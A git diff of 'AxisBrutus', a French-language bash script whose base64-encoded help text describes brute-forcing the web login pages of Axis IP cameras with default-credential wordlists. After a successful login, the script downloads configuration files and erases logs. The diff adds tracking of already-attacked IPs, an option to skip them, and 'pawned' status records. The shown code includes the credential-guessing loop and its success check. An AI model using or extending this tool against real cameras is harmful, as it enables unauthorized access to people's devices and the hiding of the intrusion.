@@ -3,6 +3,7 @@
 # h4ckr213dz@gmail.com
 # https://github.com/dino213dz/
 # Créé le 25.07.2019
+#
 ####################################################################################################################
 #                                                     AxisBrutus
 ####################################################################################################################
@@ -56,10 +57,10 @@ reset='\033[0m'
 source config/axisBrutus.lang
 source config/axisBrutus.conf
 
+horodate="$(/bin/date "+%s")"
 modele_nondetecte='AXIS inconnu inconnu'
 fichier_mdp_trouve=$fichier_mdp_trouve_default
 fichier_logs=$fichier_logs_defaut
-horodate="$(/bin/date "+%s")"
 
 #Inti. var. travail
 curl_timeout=$curl_timeout_default
@@ -74,6 +75,7 @@ echec_js=''
 echec_404=''
 skipModeleDetect='NON'
 skipGeo='NON'
+skipIfInHistory='NON'
 checkOnly='NON'
 modeVerbose='NON'
 total_fait=0
@@ -239,7 +241,7 @@ function infosGeolocalisation {
 	ip_port=$1
 	ip_only=${ip_port%:*}
 
-	infosDbIpDotCom=$(/usr/bin/curl -ks http://api.db-ip.com/v2/free/$ip_only)
+	infosDbIpDotCom=$(/usr/bin/curl -ks $url_geo_api$ip_only)
 
 	#retirer les infos inutiles
 	infosDbIpDotCom=${infosDbIpDotCom/'"ipAddress'*[0-9]'",'/''}
@@ -364,7 +366,7 @@ function ajouterEspacesSlogans {
 #FUNCTION:
 # verifie l'existence des fichiers
 function afficherAide {
-	aide_texte="IyBBWElTIEJSVVRVUwoKIyBBIHByb3BvczoKLSBBdXRldXI6IENIT1JGQSBBbGxhLWVkZGluZQotIENyw6llIGxlOiAyNS4wNy4yMDE5Ci0gRWRpdMOpIGxlOiAwMi4wOC4yMDE5Ci0gVmVyc2lvbjogMi40Ci0gQ29udGFjdDogaDRja3IyMTNkekBnbWFpbC5jb20KLSBXZWI6IGh0dHA6Ly9kaW5vMjEzZHouZnJlZS5mcgoKIyBEZXNjcmlwdGlvbjoKLSBMYSBwbHVzIGZpbmUgZGVzIGJydXRlcyEKLSBCcnV0ZSBmb3JjZSBsZXMgaW50ZXJmYWNlcyB3ZWIgZGVzIGNhbWVyYXMgSVAgQVhJUwotIE7DqWNlc3NpdGUgdW4gZmljaGllciBtZHAgZXQgdW4gZmljaGllciB1c2VybmFtZXMgOgoJMS0gLi93b3JkbGlzdHMvYXhpc191c2Vycy50eHQKCTItIC4vd29yZGxpc3RzL2F4aXNfbWRwLnR4dAotIENlcyBmaWNoaWVycyBjb250aWVubmVudCBsZXMgbG9naW5zIGV0IG1vdC1kZS1wYXNzZSBwYXIgZMOpZmF1dCBkZXMgY2Ftw6lyYXMgQXhpcy4KCiMgQWxnb3JpdGhtZToKLSBWw6lyaWZpZXIgbGVzIGTDqXBlbmRhbmNlcwotIFZlcmlmaWVyIGxlcyBwYXJhbcOodHJlcyBldCBsZXMgZmljaGllcnMKLSBWZWlmaWVyIGxhIGNvbm5lY3Rpdml0w6kgZGUgbGEgY2libGUKLSBSw6ljdXBlcmVyIGxlIG1vZMOobGUgZGUgbGEgY2Ftw6lyYQotIFJlY3VwZXJlciBsZSBmaXJtd2FyZQotIFJlY2hlcmNoZSBkJ1VSTCBwcm90w6lnw6llIHBhciBtb3QtZGUtcGFzc2UKLSBCcnV0ZSBmb3JjZQotIFNpIG1vdCBkZSBwYXNzZSB0cm91dsOpOgotIFTDqWzDqWNoYXJnZXIgbGVzIGZpY2hpZXJzIGRlIGNvbmZpZ3VyYXRpb24KLSBTYXV2ZWdhcmRlIGRlcyBkb25uw6llcwotIEVmZmFjZXIgbGVzIGxvZ3MKCiMgU3ludGF4ZToKLSAkPiAuL2F4aXNCcnV0dXMuc2ggLWMgSVA6UE9SVCBbT1BUSU9OU10KCiMgUGFyYW3DqHRyZXMgb2JsaWdhdG9pcmVzOgotIC0tY2libGUsIC1jIDogSVAsIElQOlBPUlQsIFVSTAoKIyBQYXJhbWV0cmVzIG9wdGlvbm5lbHM6Ci0gLS1za2lwLCAtcyA6IE4nZWZmZWN0dWUgcGFzIGxhIGTDqXRlY3Rpb24gZHUgbW9kw6hsZS4gTCd1cmwgY2libGUgc2VyYSAiL29wZXJhdG9yL2Jhc2ljLnNodG1sIiBxdWkgZXN0IGxhIHBsdXMgcHJvYmFibGUuIEwnYXJndW1lbnQgLS11cmwgcGV1dCDDqnRyZSB1dGlsaXPDqSBwb3VyIGNoYW5nZXIgbCd1cmwgY2libGUuCi0gLS1saXN0LCAtbCA6IGxpc3RlIGxlcyBtb2TDqGxlcyBkZSBjYW3DqXJhIGNvbXBhdGlibGVzCi0gLS1oZWxwLCAtaCA6IGFmZmljaGUgbCdhaWRlCi0gLS1uby1nZW8sIC0tbm9nZW8sIC1nIDogRMOpc2FjdGl2ZSBsYSBnw6lvbG9jYWxpc2F0aW9uIGRlIGwnSVAKLSAtLWNoZWNrLCAtLWNoayA6IFbDqXJpZmllIHVuaXF1ZW1lbnQgbGEgY29tcGF0aWJpbGl0w6kgZCd1biBtb2TDqGxlIHNhbnMgcHJvY8OpZGVyIMOgIGwnYXR0YXF1ZQotIC0tbG9nLCAtLWxvZ3MgOiBEw6lmaW5pdCBsJ2VtcGxhY2VtZW50IGR1IGZpY2hpZXIgbG9ncyBkZXMgb3DDqXJhdGlvbnMgZCdhdHRhcXVlLiBMYSB2YWxldXIgcGFyIGTDqWZhdXQgZXN0IDogLi9heGlzQnJ1dHVzLmxvZwotIC0tcGFzc3dvcmRzLCAtcCA6IGZpY2hpZXIgd29yZGxpc3QgY29udGVuYW50IGxhIGxpc3RlIGRlcyBtb3RzLWRlLXBhc3NlCi0gLS11c2VybmFtZXMsIC11OiBmaWNoaWVyIHdvcmRsaXN0IGNvbnRlbmFudCBsYSBsaXN0ZSBkZXMgbm9tcyBkJ3V0aWxpc2F0ZXVycwotIC0tZXhwb3J0LCAtLW91dHB1dCwgLW8gOiBmaWNoaWVyIGRhbnMgbGVxdWVsIGxlIG1vdC1kZS1wYXNzZSBzZXJhIGVucmVnaXN0csOpIHMnaWwgZXN0IHRyb3V2w6kuIEF1Y3VuIGZpY2hpZXIgY3LDqcOpIHNpIGxlIG1vdC1kZS1wYXNzZSBuJ2VzdCBwYXMgdHJvdXbDqQotIC0tdXJsLCAtciA6IEwndXJsIGTDqXBlbmQgZHUgbW9kw6hsZS4gVm91cyBwb3V2ZXogbGUgbW9kaWZpZXIgc2kgdm91cyBzb3VoYWl0ZXogdGVzdGVyIHVuZSBwYWdlIHdlYiBiaWVuIHByw6ljaXNlIChjYXMgZCd1biBtb2TDqGxlIGluY29ubnUgcGFyIGV4ZW1wbGUpCi0gLS12ZXJib3NlLCAtdiA6IHBlcm1ldCBkJ2FmZmljaGVyIHBsdXMgb3UgbW9pbnMgZCdpbmZvcyDDoCBsJ8OpY3Jhbi4gU2kgdmVyYmV1eCBhbG9ycyA6IEdhcmRlIMOgIGwnZWNyYW4gbGVzIGNvbWJpbmFpc29ucyB0ZXN0w6llcyAmIGFmZmljaGUgbGUgY29udGVudSBkZXMgZmljaGllcnMgdMOpbMOpY2hhcmfDqXMKLSAtLXRpbWVvdXQsIC10IDogZMOpZmluaXQgbGUgdGVtcHMgZGUgcsOpcG9uc2UgbGltaXRlIGRhbnMgY3VybAotIC0tbWF4dGltZSwgLW0gOiBkw6lmaW5pdCBsZSB0ZW1wcyBsaW1pdGUgZCd1bmUgcmVxdcOqdGUgY3VybAotIC0tcGluZy10aW1lb3V0IDogZMOpZmluaXQgbGUgdGltZW91dCBkdSB0ZXN0IGRlIGNvbm5lY3Rpdml0w6kgKHBpbmcpCi0gLS1pZ25vcmUsIC1pIDogaWdub3JlciBsZSByw6lzdWx0YXQgZHUgdGVzdCBkZSBjb25uZWN0aXZpdMOpIChhdHRhcXVlciBkYW5zIHRvdXMgbGVzIGNhcykKCiMgRXhlbXBsZXM6Ci0gQXR0YXF1ZSBzdGFuZGFyZCBwYXIgaXAgb3UgcGFyIHVybC4gbGVzIHdvcmRsaXN0IHV0aWxpc8OpcyBpY2kgc29udCBjZXV4IHBhciBkw6lmYXV0LiAoVm9pciAiRGVzY3JpcHRpb24iKQoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgMTkyLjIzLjM2LjI1NDo4MwoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgaHR0cDovLzE5Mi4yMy4zNi4yNTQ6ODMKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIGh0dHBzOi8vbWFDYW1lcmFJcDIxM2R6LmF4aXMuY29tLwoKLSBBZmZpY2hlciBsYSBsaXN0ZSBkZXMgbW9kw6hsZXMgY29tcGF0aWJsZXMKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgLS1saXN0CgotIFBhcyBkZSBnw6lvbG9jYWxpc2F0aW9uCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tbm8tZ2VvCgotIFBhcyBkZSBkw6l0ZWN0aW9uIGR1IG1vZMOobGUuIG9uIGTDqWZpbml0IGxlIFRBUkdFVFVSSSBtYW51ZWxsZW1lbnQuCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tc2tpcCAtLXVybCAvYWRtaW4vYWRtaW4uc2h0bWwKCi0gRGVmaW5pciB1bmUgbGlzdGUgZGUgbG9naW4gbW90LWRlLXBhc3NlCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tcGFzc3dvcmRzIC4vYXhpc19wYXNzLnR4dCAtLXVzZXJuYW1lcyAuL2F4aXNfdXNlcm5hbWVzLnR4dAoKLSBEw6lmaW5pciBsZSBmaWNoaWVyIGRlIHNhdXZlZ2FyZGU6CgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tZXhwb3J0IG1kcF9heGlzX3Rlc3QudHh0IC0tdmVyYm9zZQoKLSBGaWNoaWVyIGxvZ3MgZCdhdHRhcXVlOgoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgMTkyLjIzLjM2LjI1NDo4MyAtLWxvZyAuL3Rlc3QubG9nCgotIE1vZGUgdmVyYmV1eCA6CgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tdmVyYm9zZQoKLSBQYXJhbcOpdHJhZ2UgY3VybDoKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgLS1tYXh0aW1lIDEwIC0tdGltZW91dCA0CgotIFBhcmFtw6l0cmFnZSBwaW5nOgoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgMTkyLjIzLjM2LjI1NDo4MyAtLXBpbmctdGltZW91dCA0CgotIElnbm9yZXIgbGUgcsOpc3VsdGF0IGR1IHBpbmc6CgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0taWdub3JlCgo="
+	aide_texte="CiMgQVhJUyBCUlVUVVMKCiMjIEEgcHJvcG9zOgotIEF1dGV1cjogQ0hPUkZBIEFsbGEtZWRkaW5lCi0gQ3LDqWUgbGU6IDI1LjA3LjIwMTkKLSBFZGl0w6kgbGU6IDA1LjA4LjIwMTkKLSBWZXJzaW9uOiAyLjUKLSBDb250YWN0OiBoNGNrcjIxM2R6QGdtYWlsLmNvbQotIFdlYjogaHR0cDovL2Rpbm8yMTNkei5mcmVlLmZyCgojIyBEZXNjcmlwdGlvbjoKLSBMYSBwbHVzIGZpbmUgZGVzIGJydXRlcyEKLSBCcnV0ZSBmb3JjZSBsZXMgaW50ZXJmYWNlcyB3ZWIgZGVzIGNhbWVyYXMgSVAgQVhJUwotIE7DqWNlc3NpdGUgdW4gZmljaGllciBkZSBtb3RzLWRlLXBhc3NlIGV0IHVuIGZpY2hpZXIgdXNlcm5hbWVzIDoKCTEtIC4vd29yZGxpc3RzL2F4aXNfdXNlcnMudHh0CgkyLSAuL3dvcmRsaXN0cy9heGlzX21kcC50eHQKLSBDZXMgZmljaGllcnMgY29udGllbm5lbnQgbGVzIGxvZ2lucyBldCBtb3QtZGUtcGFzc2UgcGFyIGTDqWZhdXQgZGVzIGNhbcOpcmFzIEF4aXMuCgojIyBBbGdvcml0aG1lOgotIFbDqXJpZmllciBsZXMgZMOpcGVuZGFuY2VzCi0gVmVyaWZpZXIgbGVzIHBhcmFtw6h0cmVzIGV0IGxlcyBmaWNoaWVycwotIFZlcmlmaWVyIGwnaGlzdG9yaXF1ZQotIFZlcmlmaWVyIGxhIGNvbm5lY3Rpdml0w6kgZGUgbGEgY2libGUKLSBSw6ljdXBlcmVyIGxlIG1vZMOobGUgZGUgbGEgY2Ftw6lyYQotIFJlY3VwZXJlciBsZSBmaXJtd2FyZQotIFJlY2hlcmNoZSBkJ1VSTCBwcm90w6lnw6llIHBhciBtb3QtZGUtcGFzc2UKLSBCcnV0ZSBmb3JjZQotIFNpIG1vdCBkZSBwYXNzZSB0cm91dsOpOgoJLSBUw6lsw6ljaGFyZ2VyIGxlcyBmaWNoaWVycyBkZSBjb25maWd1cmF0aW9uCgktIFNhdXZlZ2FyZGUgZGVzIGRvbm7DqWVzCgktIEVmZmFjZXIgbGVzIGxvZ3MKCiMjIFN5bnRheGU6Ci0gJD4gLi9heGlzQnJ1dHVzLnNoIC1jIElQOlBPUlQgW09QVElPTlNdCgojIyBPcHRpb25zL1BhcmFtZXRyZXM6CiMjIyBQYXJhbcOodHJlcyBvYmxpZ2F0b2lyZXM6Ci0gLS1jaWJsZSwgLWMgOiBJUCwgSVA6UE9SVCwgVVJMCiMjIyBQYXJhbWV0cmVzIG9wdGlvbm5lbHM6Ci0gLS1za2lwLCAtcyA6IE4nZWZmZWN0dWUgcGFzIGxhIGTDqXRlY3Rpb24gZHUgbW9kw6hsZS4gTCd1cmwgY2libGUgc2VyYSAiL29wZXJhdG9yL2Jhc2ljLnNodG1sIiBxdWkgZXN0IGxhIHBsdXMgcHJvYmFibGUuIEwnYXJndW1lbnQgLS11cmwgcGV1dCDDqnRyZSB1dGlsaXPDqSBwb3VyIGNoYW5nZXIgbCd1cmwgY2libGUuCi0gLS1saXN0LCAtbCA6IGxpc3RlIGxlcyBtb2TDqGxlcyBkZSBjYW3DqXJhIGNvbXBhdGlibGVzCi0gLS1oZWxwLCAtaCA6IGFmZmljaGUgbCdhaWRlCi0gLS1uby1nZW8sIC0tbm9nZW8sIC1nIDogRMOpc2FjdGl2ZSBsYSBnw6lvbG9jYWxpc2F0aW9uIGRlIGwnSVAKLSAtLWNoZWNrLCAtLWNoayA6IFbDqXJpZmllIHVuaXF1ZW1lbnQgbGEgY29tcGF0aWJpbGl0w6kgZCd1biBtb2TDqGxlIHNhbnMgcHJvY8OpZGVyIMOgIGwnYXR0YXF1ZQotIC0tbG9nLCAtLWxvZ3MgOiBEw6lmaW5pdCBsJ2VtcGxhY2VtZW50IGR1IGZpY2hpZXIgbG9ncyBkZXMgb3DDqXJhdGlvbnMgZCdhdHRhcXVlLiBMYSB2YWxldXIgcGFyIGTDqWZhdXQgZXN0IDogLi9heGlzQnJ1dHVzLmxvZwotIC0tcGFzc3dvcmRzLCAtcCA6IGZpY2hpZXIgd29yZGxpc3QgY29udGVuYW50IGxhIGxpc3RlIGRlcyBtb3RzLWRlLXBhc3NlCi0gLS11c2VybmFtZXMsIC11OiBmaWNoaWVyIHdvcmRsaXN0IGNvbnRlbmFudCBsYSBsaXN0ZSBkZXMgbm9tcyBkJ3V0aWxpc2F0ZXVycwotIC0tZXhwb3J0LCAtLW91dHB1dCwgLW8gOiBmaWNoaWVyIGRhbnMgbGVxdWVsIGxlIG1vdC1kZS1wYXNzZSBzZXJhIGVucmVnaXN0csOpIHMnaWwgZXN0IHRyb3V2w6kuIEF1Y3VuIGZpY2hpZXIgY3LDqcOpIHNpIGxlIG1vdC1kZS1wYXNzZSBuJ2VzdCBwYXMgdHJvdXbDqQotIC0tdXJsLCAtciA6IEwndXJsIGTDqXBlbmQgZHUgbW9kw6hsZS4gVm91cyBwb3V2ZXogbGUgbW9kaWZpZXIgc2kgdm91cyBzb3VoYWl0ZXogdGVzdGVyIHVuZSBwYWdlIHdlYiBiaWVuIHByw6ljaXNlIChjYXMgZCd1biBtb2TDqGxlIGluY29ubnUgcGFyIGV4ZW1wbGUpCi0gLS12ZXJib3NlLCAtdiA6IHBlcm1ldCBkJ2FmZmljaGVyIHBsdXMgb3UgbW9pbnMgZCdpbmZvcyDDoCBsJ8OpY3Jhbi4gU2kgdmVyYmV1eCBhbG9ycyA6IEdhcmRlIMOgIGwnZWNyYW4gbGVzIGNvbWJpbmFpc29ucyB0ZXN0w6llcyAmIGFmZmljaGUgbGUgY29udGVudSBkZXMgZmljaGllcnMgdMOpbMOpY2hhcmfDqXMKLSAtLXRpbWVvdXQsIC10IDogZMOpZmluaXQgbGUgdGVtcHMgZGUgcsOpcG9uc2UgbGltaXRlIGRhbnMgY3VybAotIC0tbWF4dGltZSwgLW0gOiBkw6lmaW5pdCBsZSB0ZW1wcyBsaW1pdGUgZCd1bmUgcmVxdcOqdGUgY3VybAotIC0tcGluZy10aW1lb3V0IDogZMOpZmluaXQgbGUgdGltZW91dCBkdSB0ZXN0IGRlIGNvbm5lY3Rpdml0w6kgKHBpbmcpCi0gLS1pZ25vcmUsIC1pIDogaWdub3JlciBsZSByw6lzdWx0YXQgZHUgdGVzdCBkZSBjb25uZWN0aXZpdMOpIChhdHRhcXVlciBkYW5zIHRvdXMgbGVzIGNhcykKLSAtLWhpc3QtYnJlYWssIC0taGlzdG9yeS1icmVhayA6IFNhdXRlciBsZXMgY2libGVzIHByw6lzZW50ZXMgZGFucyBsJ2hpc3RvcmlxdWUuIEwnaGlzdG9yaXF1ZSBlc3Qgc3RvY2vDqSBkYW5zIGxlIGZpY2hpZXIgIi4vYXhpc0JydXR1cy5oaXN0b3J5Ii4KCiMjIEV4ZW1wbGVzOgojIyMgQXR0YXF1ZSBzdGFuZGFyZCBwYXIgaXAgb3UgcGFyIHVybDoKLSBMZXMgd29yZGxpc3QgdXRpbGlzw6lzIGljaSBzb250IGNldXggcGFyIGTDqWZhdXQuIChWb2lyICJEZXNjcmlwdGlvbiIpCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSBodHRwOi8vMTkyLjIzLjM2LjI1NDo4MwoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgaHR0cHM6Ly9tYUNhbWVyYUlwMjEzZHouYXhpcy5jb20vCiMjIyBBZmZpY2hlciBsYSBsaXN0ZSBkZXMgbW9kw6hsZXMgY29tcGF0aWJsZXM6CgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tbGlzdAojIyMgUGFzIGRlIGfDqW9sb2NhbGlzYXRpb24KCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgLS1uby1nZW8KIyMjIFBhcyBkZSBkw6l0ZWN0aW9uIGR1IG1vZMOobGU6Ci0gT24gZMOpZmluaXQgbGUgVEFSR0VUVVJJIG1hbnVlbGxlbWVudC4gcGV1dCBzZXJ2aXIgcG91ciBhdHRhcXVlciBkJ2F1dHJlcyB0eXBlIGRlIGNhbWVyYXMuIGR1IG1vbWVudCBxdSdpbCBzJ2FnaXNzZSBkJ3VuZSBwYWdlIHByb3RlZ8OpZSBwYXIgdWVuIGF1dGhlbnRpZmljYXRpb24gaHR0cCBzaW1wbGUuCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tc2tpcCAtLXVybCAvYWRtaW4vYWRtaW4uc2h0bWwKIyMjIERlZmluaXIgdW5lIGxpc3RlIGRlIGxvZ2luIG1vdC1kZS1wYXNzZToKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgLS1wYXNzd29yZHMgLi9heGlzX3Bhc3MudHh0IC0tdXNlcm5hbWVzIC4vYXhpc191c2VybmFtZXMudHh0CiMjIyBEw6lmaW5pciBsZSBmaWNoaWVyIGRlIHNhdXZlZ2FyZGU6CgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tZXhwb3J0IG1kcF9heGlzX3Rlc3QudHh0IC0tdmVyYm9zZQojIyMgRmljaGllciBsb2dzIGQnYXR0YXF1ZToKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgLS1sb2cgLi90ZXN0LmxvZwojIyMgTW9kZSB2ZXJiZXV4IDoKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgLS12ZXJib3NlCiMjIyBQYXJhbcOpdHJhZ2UgY3VybDoKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgLS1tYXh0aW1lIDEwIC0tdGltZW91dCA0CiMjIy0gUGFyYW3DqXRyYWdlIHBpbmc6CgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tcGluZy10aW1lb3V0IDQKIyMjIE5lIHBhcyBhdHRhcXVlciBsZXMgSVAgcHLDqXNlbnRlcyBkYW5zIGwnaGlzdG9yaXF1ZToKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgLS1oaXN0LWJyZWFrCgoK"
 	echo -e $banniere_aide$aide_texte|base64 -d
 	}
 
@@ -412,6 +414,23 @@ function echox	{
 	tput cuu1;tput el;echo -e "$1"
 	}
 
+function checkHistory	{
+	newip=$ip
+	
+	if [ -f "$fichier_hist_defaut" ];then
+		test=$(cat $fichier_hist_defaut|grep "$newip")
+		
+		if [ ${#test} -gt 0 ];then
+			echo "$test"		
+		else
+			echo "FALSE"
+		fi
+	else
+		touch $fichier_hist_defaut
+		echo "FALSE"
+	fi
+	
+	}
 
 function afficherBarre {
 	#entiers
@@ -564,6 +583,10 @@ for no_arg in $(seq 0 $nb_args); do
 			skipModeleDetect='NON'
 			checkOnly='OUI'
 			skipGeo='OUI'
+		fi
+		#History break
+		if [ "$valeur" = "--hist-break" ] || [ "$valeur" = "--history-break" ]; then
+			skipIfInHistory='OUI'
 		fi
 	fi
 done
@@ -744,7 +767,30 @@ fi
 #                                                 TEST DE CONNECTIVITE
 ####################################################################################################################
 
+deja_attaquee=$(checkHistory)
+deja_on=$(echo $deja_attaquee|cut -d " " -f 2)
+deja_at=$(echo $deja_attaquee|cut -d " " -f 3)
+deja_status=$(echo $deja_attaquee|cut -d " " -f 4)
+
+if [ ${#deja_status} -eq 0 ];then
+	deja_status='inconnu'
+fi
+
 echo -e "$col_section\n$souligne$section_testConnectivite:$reset"
+
+if [ "$deja_attaquee" != "FALSE" ];then
+	echo -e "$col_titre$puce_level_1$element_history_testip:$col_texte $element_history_testip_deja: $vocab_date_on $deja_on $vocab_time_at $deja_at [Etat: $deja_status]"
+	if [ "$skipIfInHistory" = "OUI" ];then
+		echo -e "$col_titre$puce_level_2 Annulation:$col_texte $element_history_testip_deja_quitter"
+		exit
+	else
+		echo -n "$ip "$(/bin/date '+%d/%m/%y %T') >> $fichier_hist_defaut
+	fi
+	
+else
+	echo -e "$col_titre$puce_level_1$element_history_testip:$col_texte $element_history_testip_new"
+	echo -n "$ip "$(/bin/date '+%d/%m/%y %T') >> $fichier_hist_defaut
+fi
 
 if [ "$noPing" != "OUI" ];then
 	echo -e "$col_titre$puce_level_1$element_testco :$col_texte ping $ip_only..."
@@ -782,7 +828,7 @@ if [ "$skipModeleDetect" = "OUI" ];then
 	logMessage "$element_analyse_mod_detect : $vocab_disabled" "$logs_type_warning" 
 	modele_complet=$modele_nondetecte
 else
-	echo -e "$col_titre$puce_level_1$element_analyse_mod_detect : $col_texte $vocab_running"
+	echo -e "$col_titre$puce_level_1$element_analyse_mod_detect :"
 	logMessage "$element_analyse_mod_detect" "$logs_type_info" 
 	#modele=$(modeleExtract $modele_complet) # resultats erronés : diag a faire
 	echo -e "$col_titre$puce_level_2$vocab_connection : $col_texte$vocab_running"
@@ -820,11 +866,11 @@ else
 	if [ "$version" != "N/A" ]; then
 		version=$(echo $modele_complet|egrep -o [0-9.,].*)
 	fi
-	echo -e "$col_texte $vocab_finished\n"
+	echo -e "$col_texte $vocab_finished"
 
 fi
 
-
+#recherche url a attaquer
 echo -en "$col_titre$puce_level_1$element_analyse_url_search...$col_texte"
 if [ "$urlforced" != "OUI" ]; then 
 	url=$(urlModele $ip $modele)
@@ -856,7 +902,7 @@ if [ "$checkOnly" != "OUI" ];then
 	echo -en "$col_titre$puce_level_1"$element_prep_env:$col_texte": "
 
 	infosGeo=${infosGeo//':'/":$col_texte"}
-	infosGeo=${infosGeo//','/"\n$col_titre |_[-]"}
+	infosGeo=${infosGeo//','/"\n$col_titre$puce_level_2 "}
 	echo -e "$col_texte $vocab_finished"
 fi
 
@@ -918,9 +964,8 @@ echo -e "$col_titre"
 if [ "$checkOnly" != "OUI" ];then
 
 	echo -e "$col_section\n$souligne$section_attack:$reset"
-
 	logMessage "Attaque en cours" "$logs_type_info"
-	 
+
 	progression_pourcent=0
 	while read user; do 
 		while read mdp; do 
@@ -964,7 +1009,7 @@ if [ "$checkOnly" != "OUI" ];then
 			if [ ${#test_unauthorized} -gt 0 ];then
 				echo -e $col_erreur$msg_echec
 			else			
-				#sinon on a administration dans le titre de la page alors considere qu'on a passé la porte :D
+			#sinon on a "administration" dans le titre de la page alors on considere qu'on a passé la porte :D
 				if [ ${#test_administration} -gt 0 ] || [ ${#test_configuration} -gt 0 ];then
 					echo -e $col_succes$msg_succes
 					mdp_trouve='OUI'
@@ -1002,8 +1047,10 @@ if [ "$checkOnly" != "OUI" ];then
 
 				fi
 			fi
-
+			
+			#si ce n'est pas verbose: effecer la ligne precedente avant d'afficher la suivante
 			if [ "$modeVerbose" != 'OUI' ];then
+				tput cuu1;tput el
 				tput cuu1;tput el
 			fi
 
@@ -1188,6 +1235,7 @@ if [ "$checkOnly" != "OUI" ]; then
 		echo -e "$col_titre$puce_level_1$element_resume_bravo:$col_texte "${element_resume_succes//"__TOTALCOMBI__"/"$col_succes$total_fait$col_texte"}
 		#On l'a trouvé en $col_succes$total_fait$col_texte essais!
 		echo -e "$col_titre$puce_level_1$element_resume_echec:$col_texte $element_resume_export : $col_succes$export_destination"
+		echo -e " $logs_type_pawned" >>$fichier_hist_defaut
 	else
 			if [ "$echec_js" = "OUI" ]; then		
 				echo -e "$col_titre$puce_level_1$element_resume_fail:$col_texte $err_javascript_resume. $col_section$smiley_sad"
@@ -1196,6 +1244,7 @@ if [ "$checkOnly" != "OUI" ]; then
 				echo -e "$col_titre$puce_level_1$element_resume_fail:$col_texte $total_fait $err_tries_without_succes $col_section$smiley_sad"
 				echo -e "$col_titre$puce_level_1$element_resume_astuce:$col_texte $msg_astuce_noresult $col_section $smiley_smart"
 			fi
+		echo -e " $logs_type_notpawned" >>$fichier_hist_defaut
 	fi
 	echo -e "$col_titre$puce_level_1$element_resume_duration:$col_texte $duree_totale"
 fi
